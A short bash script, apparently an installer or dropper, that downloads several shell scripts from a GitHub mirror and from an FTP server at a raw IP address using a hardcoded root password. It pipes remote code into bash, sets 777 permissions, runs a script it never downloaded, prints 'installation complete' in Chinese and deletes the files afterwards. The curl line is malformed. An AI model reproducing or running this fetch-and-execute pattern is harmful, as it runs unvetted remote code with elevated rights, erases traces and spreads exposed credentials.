#!/bin/bash

wget https://raw.fastgit.org/50801684/-/master/5.sh
wget ftp://159.75.133.49:21/file.txt --ftp-user=root --ftp-password=wsywsy
wget https://raw.fastgit.org/50801684/-/master/7.sh
wget https://raw.fastgit.org/50801684/-/master/8.sh
bash -c "$(curl -sS wget ftp://159.75.133.49:21/10.sh --ftp-user=root --ftp-password=wsywsy)"
sudo chmod 777 *.sh
sudo chmod 777 file.txt
./4.sh -d 
echo "安装完成"
rm -f *.sh
rm -f file.*
